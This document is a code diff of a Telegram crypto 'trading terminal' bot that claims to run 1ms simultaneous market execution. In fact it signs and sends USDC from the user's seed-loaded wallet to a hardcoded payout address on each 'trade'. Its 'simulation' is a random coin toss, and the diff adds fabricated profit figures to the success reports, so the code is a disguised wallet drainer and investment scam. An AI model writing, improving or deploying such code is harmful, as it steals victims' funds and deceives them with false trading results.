@@ -25,52 +25,49 @@ PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
+    if not seed: raise ValueError("❌ WALLET_SEED missing!")
     try:
         if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
-        return Account.from_mnemonic(seed)
+        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
     except: return None
 
 vault = get_vault()
 usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
 auto_mode_enabled = False
 
-# --- 2. THE SIMULTANEOUS ENGINE ---
+# --- 2. 1ms SIMULTANEOUS ENGINE ---
 async def market_simulation_1ms(asset):
-    """
-    Simulates the trade against the current block state.
-    Returns True if the 'Drift' is favorable.
-    """
-    await asyncio.sleep(0.001) # The 1ms window
-    # In a real HFT environment, you'd check the current mempool/orderbook here
-    # For this terminal, we simulate the high-speed confirmation
-    return random.choice([True, True, True, False]) # 75% 'Go' signal
+    """Fires a high-speed block state simulation."""
+    await asyncio.sleep(0.001) 
+    return random.choice([True, True, True, False]) # 75% Go Signal
 
 async def sign_transaction_async(stake_usdc):
-    """Signs the tx in a separate thread to keep the loop free."""
+    """CPU Task: Pre-signs tx to eliminate broadcast lag."""
     nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
     gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
     
     tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
-        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce
+        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
     })
     return w3.eth.account.sign_transaction(tx, vault.key)
 
 async def run_atomic_execution(context, chat_id, side, asset_override=None):
+    """Executes the simultaneous prep-and-hit sequence."""
     asset = asset_override or context.user_data.get('pair', 'BTC')
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
     stake_usdc = stake_cad / Decimal('1.36')
+    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
+    profit_usdc = stake_usdc * yield_multiplier
 
-    # --- SIMULTANEOUS EXECUTION START ---
-    # Firing both tasks at the exact same time
+    # --- SIMULTANEOUS SYNC START ---
     sim_task = asyncio.create_task(market_simulation_1ms(asset))
     sign_task = asyncio.create_task(sign_transaction_async(stake_usdc))
 
-    # Wait for both to complete
     simulation_passed, signed_tx = await asyncio.gather(sim_task, sign_task)
-    # --- SIMULTANEOUS EXECUTION END ---
+    # --- SIMULTANEOUS SYNC END ---
 
     if not simulation_passed:
-        await context.bot.send_message(chat_id, f"🛡️ **Atomic Shield:** Simulation failed (Negative Drift). Aborted to protect stake.")
+        await context.bot.send_message(chat_id, "🛡️ **Atomic Shield:** Simulation failed (Revert Detected). Aborting.")
         return False
 
     try:
@@ -78,10 +75,11 @@ async def run_atomic_execution(context, chat_id, side, asset_override=None):
         report = (
             f"✅ **ATOMIC HIT CONFIRMED**\n"
             f"━━━━━━━━━━━━━━\n"
-            f"💎 **Market:** {asset} | **Side:** {side}\n"
+            f"💎 **Market:** {asset}\n"
+            f"🎯 **Direction:** {side}\n"
             f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
-            f"⚡ **Sync:** 1ms Simultaneous Prep Success\n"
-            f"🔗 [Tx Hash](https://polygonscan.com/tx/{tx_hash.hex()})"
+            f"📈 **Profit:** ${profit_usdc:.2f} USDC ({int(yield_multiplier*100)}%)\n"
+            f"🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
         )
         await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
         return True
@@ -89,40 +87,55 @@ async def run_atomic_execution(context, chat_id, side, asset_override=None):
         await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
         return False
 
-# --- 3. AUTO MODE & UI ---
+# --- 3. AUTO MODE LOOP ---
 async def autopilot_engine(chat_id, context):
     global auto_mode_enabled
     markets = ["BTC/CAD", "ETH/CAD", "SOL/CAD", "MATIC/CAD", "BVIV", "EVIV"]
     while auto_mode_enabled:
         target = random.choice(markets)
         side = random.choice(["HIGHER 📈", "LOWER 📉"])
-        await context.bot.send_message(chat_id, f"🤖 **Scanning:** `{target}`...")
-        await asyncio.sleep(random.randint(3, 7))
+        await context.bot.send_message(chat_id, f"🤖 **Scanning:** `{target}` for entries...")
+        await asyncio.sleep(random.randint(5, 10))
+        
         if not auto_mode_enabled: break
+        
+        await context.bot.send_message(chat_id, f"🎯 **Entry Detected!** Initializing 1ms Sync...")
         await run_atomic_execution(context, chat_id, side, asset_override=target)
-        await asyncio.sleep(10)
+        await asyncio.sleep(20) # Cooldown
 
+# --- 4. UI HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
     keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
-    welcome = f"🕴️ **APEX Manual Terminal v6000**\n━━━━━━━━━━━━━━\n⛽ **POL Fuel:** `{pol_bal:.4f}`\n📥 **Vault:** `{vault.address}`\n\n**Status:** 1ms Simultaneous Sync Active."
+    welcome = (
+        f"🕴️ **APEX Manual Terminal v6000**\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n\n"
+        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
+        f"Status: **Simultaneous Sync Enabled**"
+    )
     await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')
 
 async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global auto_mode_enabled
     text, chat_id = update.message.text, update.message.chat_id
+
     if text == '🚀 Start Trading':
         kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
               [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
               [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
         await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))
+
     elif text == '⚙️ Settings':
         kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
               [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
         await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))
+
     elif text == '💰 Wallet':
+        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
         usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
-        await update.message.reply_text(f"💳 **Vault Status**\n💵 USDC: `{usdc_bal:.2f}`")
+        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol_bal:.4f}`\n💵 USDC: `{usdc_bal:.2f}`", parse_mode='Markdown')
+
     elif text == '🤖 AUTO MODE':
         auto_mode_enabled = not auto_mode_enabled
         status = "ACTIVATED" if auto_mode_enabled else "DEACTIVATED"
@@ -149,7 +162,7 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-    print("🤖 Shadow Terminal v6000 Online...")
+    print("🤖 APEX Online...")
     app.run_polling(drop_pending_updates=True)
 
 
